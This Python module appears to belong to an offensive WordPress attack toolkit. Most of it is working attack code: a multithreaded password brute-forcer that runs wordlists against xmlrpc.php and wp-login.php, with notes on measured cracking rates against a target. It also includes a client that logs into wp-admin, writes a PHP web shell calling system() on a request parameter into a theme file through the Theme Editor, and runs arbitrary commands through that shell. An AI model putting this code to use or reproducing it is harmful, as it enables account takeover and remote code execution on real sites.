"""Injected source shared by the WordPress attack tools.

The XML-RPC transport, the cookie-aware HTTP session and the wp-login primitive
live here as plain *source text* (``XMLRPC_SOURCE``) so the **same** code runs
inside the sandbox client and inside the unit tests (which ``exec`` the
constant). This is the pattern established by ``._pwn.ANALYZER_SOURCE``: one
definition, two consumers, so the parser cannot drift from the transport.

THE BATCHING TRAP (measured on the "Internal" target, 2026-10-10)
================================================================

The tempting optimisation is ``system.multicall``: one HTTP request that
authenticates *N* passwords. It is **wrong on WordPress** and it fails silently.

WordPress aborts the multicall as soon as one authentication is rejected: every
call *after* the first failure — including calls that need no authentication at
all — inherits the same fault. Measured with two-call probes (``S`` = answered,
``F`` = fault)::

    [getCapabilities, auth(wrong)]     -> "SF"   independent evaluation
    [auth(wrong), auth(wrong)]         -> "FF"
    [auth(wrong), getCapabilities]     -> "FF"   the rejection poisoned it
    [auth(valid), auth(wrong)]         -> "SF"
    [auth(wrong), auth(valid)]         -> "FF"   <-- the false negative

A 1500-call batch therefore tests **one** password and reports 1499 false
negatives, and the suspicious ``≈8000 pw/s`` throughput is itself the giveaway:
only one password per request is ever hashed. Sweeping rockyou with multicall
"tested" 14,338,500 candidates and found nothing while the real credential
(rockyou line 3882) sat inside the first three batches.

The tool therefore authenticates **one password per request** and it *self-tests*
the assumption on every run (:func:`xmlrpc_short_circuit_probe`). Measured cost
of one authentication: ~220 ms round trip on the Internal target (4.6 pw/s per
connection, ~28 pw/s with 30 connections — matching wpscan's observed rate),
which is why a 14.3 M-entry sweep is not a realistic plan and why
``max_attempts`` defaults to the "top of the dictionary" region.
"""

from __future__ import annotations

#: Marker wrapped around the output of a command run through the implant.
WP_EXEC_MARKER = "NEXUS_WP_EXEC"
#: Parameter the implant reads the command from.
WP_EXEC_PARAMETER = "nexuswpmcmd"


XMLRPC_SOURCE = r'''
import gzip
import http.cookiejar
import time
import urllib.error
import urllib.parse
import urllib.request
import xml.etree.ElementTree as ET

WP_USER_AGENT = "Mozilla/5.0 (X11; Linux x86_64) OMNI-WordPress"
#: Method used to prove a credential. Any method that authenticates works; this
#: one is universally available on WP 3.5+ and its failure is unambiguous.
WP_AUTH_METHOD = "wp.getUsersBlogs"


def xml_sanitize(text):
    """Drop characters that are not legal in XML 1.0.

    rockyou contains a handful of entries with raw control bytes (``u\\x08ritain``,
    ``\\x1axCvBnM,`` …); embedding one produced a server-side
    ``fault -32700 parse error. not well formed`` that used to abort a whole
    batch. Encoding the value as a numeric character reference is not possible
    either, so the offending bytes are removed.
    """
    out = []
    for ch in str(text):
        point = ord(ch)
        if ch in "\t\n\r" or 0x20 <= point <= 0xD7FF or 0xE000 <= point <= 0xFFFD or point >= 0x10000:
            out.append(ch)
    return "".join(out)


def xml_escape(text):
    return (xml_sanitize(text).replace("&", "&amp;").replace("<", "&lt;")
            .replace(">", "&gt;").replace('"', "&quot;").replace("'", "&apos;"))


def xmlrpc_login_body(username, password, method=WP_AUTH_METHOD):
    """Body that authenticates exactly ONE credential (one HTTP request)."""
    return (
        '<?xml version="1.0"?>'
        "<methodCall><methodName>" + method + "</methodName>"
        "<params><param><value><array><data>"
        "<value><string>" + xml_escape(username) + "</string></value>"
        "<value><string>" + xml_escape(password) + "</string></value>"
        "</data></array></value></param></params></methodCall>"
    ).encode("utf-8")


def _call_fragment(method, params):
    values = "".join("<value><string>" + xml_escape(item) + "</string></value>" for item in params)
    return (
        "<value><struct>"
        "<member><name>methodName</name><value><string>" + method + "</string></value></member>"
        "<member><name>params</name><value><array><data>" + values
        + "</data></array></value></member></struct></value>"
    )


def xmlrpc_multicall_body(calls):
    """Build a ``system.multicall`` body from ``[(method, [params...]), ...]``.

    Only used to *prove* the short-circuit behaviour (see
    :func:`xmlrpc_short_circuit_probe`); it is never the credential transport.
    """
    fragments = "".join(_call_fragment(method, params) for method, params in calls)
    return (
        '<?xml version="1.0"?>'
        "<methodCall><methodName>system.multicall</methodName>"
        "<params><param><value><array><data>" + fragments
        + "</data></array></value></param></params></methodCall>"
    ).encode("utf-8")


def _member_fault(element):
    for member in element.iter("member"):
        if (member.findtext("name") or "").strip() == "faultCode":
            value = member.find("value")
            text = "".join(value.itertext()).strip() if value is not None else ""
            return text or "fault"
    return None


def _fault_string(node):
    for member in node.iter("member"):
        if (member.findtext("name") or "").strip() == "faultString":
            value = member.find("value")
            text = "".join(value.itertext()).strip() if value is not None else ""
            return text or "fault"
    return None


def parse_call_outcome(payload):
    """Return ``{"faulted": bool, "fault": str|None}`` for one methodResponse.

    Raises ``ValueError`` when the payload is not an XML-RPC response at all, so
    a WAF page or an HTML error is never read as "the credential was rejected".
    """
    if isinstance(payload, (bytes, bytearray)):
        payload = payload.decode("utf-8", "replace")
    try:
        root = ET.fromstring(payload)
    except ET.ParseError as exc:
        raise ValueError("xmlrpc response is not valid XML: %s" % exc)
    if root.tag != "methodResponse":
        raise ValueError("xmlrpc response is not a methodResponse")
    fault = root.find("fault")
    if fault is not None:
        return {"faulted": True, "fault": _fault_string(fault) or "fault"}
    inner = root.find("params/param/value")
    if inner is None:
        raise ValueError("xmlrpc response has no result value")
    if _member_fault(inner) is not None:
        return {"faulted": True, "fault": _member_fault(inner)}
    return {"faulted": False, "fault": None}


def parse_multicall_results(payload):
    """Return the per-call ``faulted`` flags of a multicall response.

    Used by the short-circuit probe (and by the unit tests) to show that the
    outcome of call *i* depends on the outcome of call *i-1*.
    """
    if isinstance(payload, (bytes, bytearray)):
        payload = payload.decode("utf-8", "replace")
    try:
        root = ET.fromstring(payload)
    except ET.ParseError as exc:
        raise ValueError("xmlrpc response is not valid XML: %s" % exc)
    data = root.find("params/param/value/array/data")
    if data is None:
        raise ValueError("xmlrpc response is not a multicall array")
    return [_member_fault(item) is not None for item in list(data)]


def _decompress(headers, body):
    if (headers.get("Content-Encoding") or "").lower() == "gzip":
        try:
            return gzip.decompress(body)
        except OSError:
            return body
    return body


class WpSession(object):
    """Cookie-aware HTTP session (stdlib only) with gzip-aware reads."""

    def __init__(self, timeout=30.0):
        self.jar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(self.jar))
        self.timeout = timeout

    def request(self, url, data=None, headers=None, method=None, timeout=None):
        request = urllib.request.Request(url, data=data, method=method)
        request.add_header("User-Agent", WP_USER_AGENT)
        # Small win, zero cost: the fault response compresses well.
        request.add_header("Accept-Encoding", "gzip")
        for name, value in (headers or {}).items():
            request.add_header(name, value)
        deadline = self.timeout if timeout is None else float(timeout)
        try:
            response = self.opener.open(request, timeout=deadline)
        except urllib.error.HTTPError as exc:
            body = exc.read()
            return exc.code, dict(exc.headers or {}), _decompress(exc.headers or {}, body)
        body = response.read()
        return response.status, dict(response.headers), _decompress(response.headers, body)

    def clear_login_cookies(self):
        keep = [cookie for cookie in self.jar if not cookie.name.startswith("wordpress_logged_in")]
        self.jar.clear()
        for cookie in keep:
            self.jar.set_cookie(cookie)

    def has_login_cookie(self):
        for cookie in self.jar:
            if cookie.name.startswith("wordpress_logged_in") and cookie.value:
                return True
        return False


def xmlrpc_try(base, username, password, timeout=30.0, session=None):
    """Authenticate ONE credential over XML-RPC; True when WordPress accepts it."""
    session = session or WpSession(timeout=timeout)
    _status, _headers, payload = session.request(
        base.rstrip("/") + "/xmlrpc.php",
        data=xmlrpc_login_body(username, password),
        headers={"Content-Type": "text/xml"},
        timeout=timeout,
    )
    return not parse_call_outcome(payload)["faulted"]


def _multicall_flags(base, calls, timeout):
    """Run a multicall and return the per-call flags as an ``"FS"``-style string."""
    session = WpSession(timeout=timeout)
    _status, _headers, payload = session.request(
        base.rstrip("/") + "/xmlrpc.php",
        data=xmlrpc_multicall_body(calls),
        headers={"Content-Type": "text/xml"},
        timeout=timeout,
    )
    faults = parse_multicall_results(payload)
    return "".join("F" if faulted else "S" for faulted in faults)


def xmlrpc_preflight(base, username, timeout=30.0):
    """Cheap sanity check that the XML-RPC auth path is live before a sweep.

    Two single calls: a deliberately impossible credential must be *rejected*
    (so the endpoint is reachable and really validating) and
    ``system.getCapabilities`` must be *answered* (so XML-RPC is functional).
    Aborting on a failed preflight is what stops a whole sweep from "succeeding"
    against an endpoint that refuses everything.
    """
    result = {"reachable": False, "auth_path_active": False, "capabilities_ok": False}
    try:
        accepted = xmlrpc_try(base, username, "omni-impossible-" + str(time.time()), timeout)
        result["reachable"] = True
        result["auth_path_active"] = accepted is False
    except Exception as exc:
        result["error"] = "%s: %s" % (type(exc).__name__, exc)
    try:
        flags = _multicall_flags(base, [("system.getCapabilities", [])], timeout)
        result["capabilities_ok"] = flags == "S"
    except Exception:
        result["capabilities_ok"] = False
    result["ok"] = bool(result["reachable"] and result["auth_path_active"])
    return result


def xmlrpc_batching_probe(base, username, valid_password, timeout=30.0):
    """Measure whether ``system.multicall`` can be trusted *now that a valid
    credential exists*.

    The correlation is only observable with a known-good credential: a
    multicall whose first call is rejected and whose second call carries the
    correct password must answer ``SF``, and on WordPress it answers ``FF``.

    This is deliberately **post-discovery evidence, not a gate**: before a
    credential is known the property cannot be measured, which is exactly why
    the transport never batches in the first place. It is recorded so the
    limitation is documented from the target instead of from folklore.
    """
    evidence = {"applicable": False, "batching_unsound": None, "observed": None}
    try:
        single = _multicall_flags(base, [(WP_AUTH_METHOD, [username, valid_password])], timeout)
        paired = _multicall_flags(
            base,
            [(WP_AUTH_METHOD, [username, "omni-impossible-" + str(time.time())]),
             (WP_AUTH_METHOD, [username, valid_password])],
            timeout,
        )
    except Exception as exc:
        evidence["error"] = "%s: %s" % (type(exc).__name__, exc)
        return evidence
    evidence["applicable"] = True
    evidence["control"] = single
    evidence["observed"] = paired
    # Control must be a clean success for the comparison to mean anything.
    evidence["batching_unsound"] = (single == "S") and (paired == "FF")
    return evidence


def wp_login_attempt(session, base, username, password, timeout=30.0):
    """POST ``wp-login.php`` once; True when WordPress issued a login cookie."""
    base = base.rstrip("/")
    session.clear_login_cookies()
    payload = urllib.parse.urlencode({
        "log": username,
        "pwd": password,
        "wp-submit": "Log In",
        "redirect_to": base + "/wp-admin/",
        "testcookie": "1",
    }).encode("utf-8")
    session.request(
        base + "/wp-login.php",
        data=payload,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        timeout=timeout,
    )
    return session.has_login_cookie()


def wp_login(base, username, password, timeout=30.0):
    """Full login: fetch the test cookie, then authenticate."""
    session = WpSession(timeout=timeout)
    session.request(base.rstrip("/") + "/wp-login.php", timeout=timeout)
    ok = wp_login_attempt(session, base, username, password, timeout)
    return session, ok


def verify_wp_credential(base, username, password, timeout=30.0):
    """Re-validate a candidate credential through two independent transports."""
    evidence = {"xmlrpc": False, "wp_login": False}
    try:
        evidence["xmlrpc"] = xmlrpc_try(base, username, password, timeout)
    except Exception:
        evidence["xmlrpc"] = False
    try:
        _session, ok = wp_login(base, username, password, timeout)
        evidence["wp_login"] = bool(ok)
    except Exception:
        evidence["wp_login"] = False
    evidence["ok"] = evidence["xmlrpc"] or evidence["wp_login"]
    return evidence
'''


#: Client executed in the sandbox for ``nexus.web.wp_bruteforce``. argv after
#: ``-c``: transport base username wordlist offset limit workers timeout
#: progress_path result_path. One authentication per HTTP request.
#: ``__XMLRPC__`` is replaced with :data:`XMLRPC_SOURCE`.
WP_BRUTEFORCE_CLIENT_SCRIPT = r'''
import json, sys, threading, time

__XMLRPC__


def load_words(path, offset, limit):
    words = []
    with open(path, "r", encoding="utf-8", errors="replace") as handle:
        for index, line in enumerate(handle):
            if index < offset:
                continue
            token = line.rstrip("\r\n")
            if not token:
                continue
            words.append(token)
            if len(words) >= limit:
                break
    return words


def append_line(path, payload):
    try:
        with open(path, "a", encoding="utf-8") as handle:
            handle.write(json.dumps(payload) + "\n")
    except OSError:
        pass


def write_result(path, payload):
    try:
        with open(path, "w", encoding="utf-8") as handle:
            json.dump(payload, handle)
    except OSError:
        pass


def main():
    (transport, base, username, wordlist, offset_raw, limit_raw,
     workers_raw, timeout_raw, progress_path, result_path) = sys.argv[1:11]
    offset = int(offset_raw)
    limit = int(limit_raw)
    workers = max(1, int(workers_raw))
    timeout = float(timeout_raw)

    words = load_words(wordlist, offset, limit)
    total = len(words)

    # Sanity-check the endpoint before spending the wordlist on it: a request
    # that never rejects an impossible credential means the sweep would report
    # "no password" for a broken transport.
    preflight = {}
    try:
        preflight = xmlrpc_preflight(base, username, timeout)
    except Exception as exc:
        preflight = {"ok": False, "error": "%s: %s" % (type(exc).__name__, exc)}
    if preflight.get("reachable") and not preflight.get("auth_path_active"):
        outcome = {"ok": False, "error": "xmlrpc_auth_path_inactive", "tested": 0,
                   "preflight": preflight}
        write_result(result_path, outcome)
        print(json.dumps(outcome))
        return

    if total == 0:
        outcome = {"ok": False, "error": "wordlist_empty", "tested": 0, "preflight": preflight}
        write_result(result_path, outcome)
        print(json.dumps(outcome))
        return

    started = time.time()
    lock = threading.Lock()
    state = {"tested": 0, "cursor": 0, "found": [], "errors": []}
    stop = threading.Event()

    def note_error(message):
        with lock:
            if message not in state["errors"]:
                state["errors"].append(message)

    def worker():
        session = WpSession(timeout=timeout)
        if transport != "xmlrpc":
            session.request(base.rstrip("/") + "/wp-login.php", timeout=timeout)
        while not stop.is_set():
            with lock:
                if state["cursor"] >= total:
                    return
                index = state["cursor"]
                state["cursor"] += 1
            password = words[index]
            try:
                if transport == "xmlrpc":
                    accepted = xmlrpc_try(base, username, password, timeout, session=session)
                else:
                    accepted = wp_login_attempt(session, base, username, password, timeout)
            except Exception as exc:
                note_error("%s: %s" % (type(exc).__name__, exc))
                return
            with lock:
                state["tested"] += 1
                if accepted:
                    state["found"].append(password)
                    stop.set()
            if accepted:
                return

    threads = [threading.Thread(target=worker) for _ in range(workers)]
    for thread in threads:
        thread.daemon = True
        thread.start()
    last_note = time.time()
    while any(thread.is_alive() for thread in threads):
        time.sleep(0.5)
        now = time.time()
        if now - last_note >= 5:
            last_note = now
            with lock:
                append_line(progress_path, {
                    "tested": state["tested"], "total": total,
                    "elapsed_seconds": round(now - started, 1)})
    for thread in threads:
        thread.join(timeout=2)

    password = state["found"][0] if state["found"] else None
    verification = {"ok": False, "xmlrpc": False, "wp_login": False}
    batching = {"applicable": False, "batching_unsound": None}
    if password:
        try:
            verification = verify_wp_credential(base, username, password, timeout)
        except Exception as exc:
            verification = {"ok": False, "error": "%s: %s" % (type(exc).__name__, exc)}
        try:
            batching = xmlrpc_batching_probe(base, username, password, timeout)
        except Exception as exc:
            batching = {"applicable": False,
                        "error": "%s: %s" % (type(exc).__name__, exc)}
    elapsed = time.time() - started
    outcome = {
        "ok": True,
        "transport": transport,
        "username": username,
        "tested": state["tested"],
        "total": total,
        "password": password,
        "verification": verification,
        "preflight": preflight,
        "batching": batching,
        "elapsed_seconds": round(elapsed, 3),
        "rate_per_second": round(state["tested"] / elapsed, 1) if elapsed else 0.0,
        "errors": state["errors"][:5],
    }
    write_result(result_path, outcome)
    print(json.dumps(outcome))


main()
'''.replace("__XMLRPC__", XMLRPC_SOURCE)


#: Client executed in the sandbox for ``nexus.web.wp_exec``. argv after ``-c``:
#: base username password theme file commands_json content_b64 restore timeout.
#: It authenticates against ``wp-admin``, writes a payload into a theme file
#: through the built-in Theme Editor, runs the commands against the implant and
#: (by default) puts the original file back.
WP_EXEC_CLIENT_SCRIPT = r'''
import base64, json, re, sys, urllib.parse

__XMLRPC__

BEGIN = "NEXUS_WP_BEGIN"
END = "NEXUS_WP_END"
PARAM = "nexuswpmcmd"


def emit(payload):
    print(json.dumps(payload))


def text(body):
    return body.decode("utf-8", "replace") if isinstance(body, (bytes, bytearray)) else str(body)


def find_hidden(body, name):
    """Value of ``<input type="hidden" name="<name>" value="..." />``.

    Attribute order is not guaranteed, so the tag is located by ``name`` and the
    value is read out of the same tag. WordPress 5.4's theme editor calls its
    CSRF field ``nonce`` (older releases used ``_wpnonce``), and it echoes an
    ``_wp_http_referer`` that includes the sub-directory, so both are read from
    the page instead of being guessed.
    """
    for tag in re.findall(r'<input[^>]*>', body):
        if not re.search(r'name=["\']' + re.escape(name) + r'["\']', tag):
            continue
        value = re.search(r'value=["\']([^"\']*)["\']', tag)
        if value:
            return value.group(1)
    return None


def find_nonce(body):
    """Return ``(field_name, value)`` of the editor's CSRF token, or ``(None, None)``."""
    for name in ("nonce", "_wpnonce"):
        value = find_hidden(body, name)
        if value:
            return name, value
    return None, None


def find_textarea(body, name):
    match = re.search(r'<textarea[^>]*name=["\']' + re.escape(name) + r'["\'][^>]*>(.*?)</textarea>',
                      body, re.S)
    if not match:
        return None
    value = match.group(1)
    for entity, char in (("&lt;", "<"), ("&gt;", ">"), ("&quot;", '"'), ("&#039;", "'"), ("&amp;", "&")):
        value = value.replace(entity, char)
    return value


def build_payload(original):
    block = ('<?php if(isset($_REQUEST["' + PARAM + '"])){echo "' + BEGIN
             + '";system($_REQUEST["' + PARAM + '"]);echo "' + END + '";} ?>\n')
    return block + original


def command_output(body):
    start = body.find(BEGIN)
    if start == -1:
        return None
    start += len(BEGIN)
    stop = body.find(END, start)
    if stop == -1:
        stop = len(body)
    return body[start:stop]


def main():
    (base, username, password, theme, target_file, commands_raw, content_b64,
     restore_raw, timeout_raw) = sys.argv[1:10]
    base = base.rstrip("/")
    commands = json.loads(commands_raw)
    restore = restore_raw == "1"
    timeout = float(timeout_raw)
    shell_url = base + "/wp-content/themes/" + theme + "/" + target_file
    editor_url = base + "/wp-admin/theme-editor.php?file=" + urllib.parse.quote(target_file) + "&theme=" + theme

    result = {"ok": False, "authenticated": False, "implanted": False,
              "theme": theme, "file": target_file, "shell_url": shell_url,
              "editor_url": editor_url, "outputs": []}
    try:
        session, logged_in = wp_login(base, username, password, timeout)
        result["authenticated"] = bool(logged_in)
        if not logged_in:
            result["error"] = "wp_admin_login_failed"
            emit(result)
            return

        status, _headers, body = session.request(editor_url, timeout=timeout)
        page = text(body)
        if "wp-login" in page and "theme-editor" not in page:
            result["error"] = "wp_admin_session_rejected"
            emit(result)
            return
        nonce_field, nonce_value = find_nonce(page)
        original = find_textarea(page, "newcontent")
        if nonce_value is None or original is None:
            result["error"] = "wp_theme_editor_unavailable"
            result["http_status"] = status
            emit(result)
            return
        referer = find_hidden(page, "_wp_http_referer") or \
            "/wp-admin/theme-editor.php?file=" + target_file + "&theme=" + theme
        result["nonce_field"] = nonce_field
        result["original_length"] = len(original)
        new_content = base64.b64decode(content_b64).decode("utf-8", "replace") if content_b64 else build_payload(original)

        def submit(nonce_value, content):
            body = urllib.parse.urlencode({
                nonce_field: nonce_value,
                "_wp_http_referer": referer,
                "newcontent": content,
                "action": "update",
                "file": target_file,
                "theme": theme,
                "submit": "Update File",
            }).encode("utf-8")
            return session.request(editor_url, data=body,
                                   headers={"Content-Type": "application/x-www-form-urlencoded"},
                                   timeout=timeout)

        submit(nonce_value, new_content)
        _status, _headers, probe = session.request(shell_url + "?" + PARAM + "=" + urllib.parse.quote("echo OK"), timeout=timeout)
        probe_text = text(probe)
        if BEGIN not in probe_text:
            result["error"] = "wp_theme_editor_write_denied"
            result["preview"] = probe_text[:400]
            if restore:
                status, _headers, page2 = session.request(editor_url, timeout=timeout)
                fresh, fresh_value = find_nonce(text(page2))
                if fresh_value:
                    submit(fresh_value, original)
            emit(result)
            return
        result["implanted"] = True

        for command in commands:
            _status, _headers, body = session.request(
                shell_url + "?" + PARAM + "=" + urllib.parse.quote(command), timeout=timeout)
            output = command_output(text(body))
            result["outputs"].append({"command": command, "stdout": output if output is not None else ""})

        result["restored"] = False
        if restore:
            status, _headers, page2 = session.request(editor_url, timeout=timeout)
            fresh, fresh_value = find_nonce(text(page2))
            if fresh_value:
                submit(fresh_value, original)
                result["restored"] = True
        result["ok"] = True
    except Exception as exc:
        result["error"] = "%s: %s" % (type(exc).__name__, exc)
    emit(result)


main()
'''.replace("__XMLRPC__", XMLRPC_SOURCE)

__all__ = [
    "WP_BRUTEFORCE_CLIENT_SCRIPT",
    "WP_EXEC_CLIENT_SCRIPT",
    "WP_EXEC_MARKER",
    "WP_EXEC_PARAMETER",
    "XMLRPC_SOURCE",
]
